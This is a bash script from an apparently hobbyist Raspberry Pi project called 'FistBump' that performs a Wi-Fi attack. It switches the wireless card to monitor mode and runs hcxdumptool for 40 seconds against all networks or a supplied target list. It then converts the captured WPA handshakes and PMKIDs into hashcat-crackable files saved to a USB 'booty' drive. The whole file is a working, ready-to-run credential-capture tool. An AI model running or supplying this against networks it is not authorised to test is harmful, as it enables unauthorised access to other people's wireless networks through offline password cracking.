#!/bin/bash

# This script is the actual FistBump attack
# Called by arm_trigger.py

# 2018 - Erik Liddell Freely distributed under MIT license.

# VARIABLES
DATE=$(date +"%Y%m%d%H%M")
bootydir="/media/usb0"
python /home/pi/FistBump/clearblinkt.py
TARGETSFILE=$bootydir"/targets.txt"
FILTER=""

if [ -e "/dev/sda" ]; then
        echo "flash drive attached"
	#number of handshakes existing
	prevCap=$(ls /media/usb0 | wc -l)
	echo $prevCap
else 
        echo "Error: Booty drive not present"
        echo "Please insert a usb thumb dirve"
	# show red for 3 seconds
    	python /home/pi/FistBump/rgb.py 255 0 0 &
	sleep 3
	python /home/pi/FistBump/rgb.py 0 0 0 &
	python /home/pi/FistBump/arm_trigger.py
	exit
fi

# ---- set up interface
python /home/pi/FistBump/purple_scan.py &
INDI=$!

# kill wpa_supplicant
sudo killall wpa_supplicant

# setup interface
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo rfkill unblock all
sudo ip link set wlan0 up

kill $INDI

# ---- start attack
if [ -f "$TARGETSFILE" ]
then 
	echo "Targets Specified"
	python /home/pi/FistBump/random_purple.py &
	INDI=$!
	FILTER="--filterlist=$TARGETSFILE --filtermode=2"
	DATE="targeted_$DATE"
else
	echo "No targets specified"
	python /home/pi/FistBump/random_colors.py &
	INDI=$!
fi

timeout -k 40 40 sudo hcxdumptool -i wlan0 $FILTER --enable_status=3 -o $DATE.pcapng &
PID=$!

sleep 40

sudo kill -TERM $PID

sudo hcxpcaptool -z $bootydir/$DATE.16800 -o $bootydir/$DATE.2500 $DATE.pcapng
sudo rm $DATE.pcapng

# if  we have a handshake file lets make a catalog of essids in that file
if [ -f $bootydir/$DATE.2500 ]; then
	wlanhcxinfo -i $bootydir/$DATE.2500 -a -e > $bootydir/$DATE.catalog
fi

kill $INDI

# -----check results
totalCap=$(ls /media/usb0 | wc -l)
if [ $totalCap -gt $prevCap ]; then
	python /home/pi/FistBump/rgb.py 255 0 255 &
else
	python /home/pi/FistBump/rgb.py 255 150 0 &
fi

sleep 3

python /home/pi/FistBump/rgb.py 0 0 0
python /home/pi/FistBump/clearblinkt.py
python /home/pi/FistBump/arm_trigger.py
exit
